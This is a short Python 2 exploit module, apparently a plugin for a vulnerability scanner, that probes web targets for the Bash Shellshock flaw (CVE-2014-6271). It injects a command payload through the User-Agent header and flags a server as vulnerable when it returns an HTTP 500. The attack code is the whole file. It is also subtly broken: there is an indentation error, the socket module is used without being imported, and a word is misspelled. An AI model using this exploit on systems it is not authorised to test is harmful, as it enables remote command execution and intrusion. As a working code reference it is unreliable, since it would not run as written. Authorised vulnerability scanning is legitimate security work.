#coding=utf-8
import requests
from libs.exploit_core import ExploitCore
from libs.exploit_http import EXPHttp
class SafecatExploit(ExploitCore):
	def __init__(self):
		self.info = {
			'Name':'Shellshock Vulnerability',
			'Description':'Bash shell远程命令执行漏洞',
			'Author':['Exploit'],
			'Product':'Gnu Bash Shell',
			'Reference':[
				['CVE','2014-6271'],
				['URL','http://www.exploit-db.com/exploits/34765/']
			],    #漏洞信息
			'DisclosureDate':'2014-09',  #发布时间
			#攻击代码
			'Payload':{
				'POC':"() { 1;}; echo -e xxxx"
			},
			'Platform':['linux','cgi-used'],
			'Targets':['U/Linux']

		}

	def exploit(self,url):
		useragent_header = {
			'User-Agent':self.info['Payload']['POC']
		}
		try:
			r = requests.get(url,headers=useragent_header)
				if r.status_code == 500:
					return (url,' is vulnerabile!')
				else:
					return None
		except socket.timeout, e:
			print e
			return None
		except requests.exceptions.Timeout, e:
			print e
			return None
		except requests.exceptions.ConnectionError, e:
			print e
			return None
		



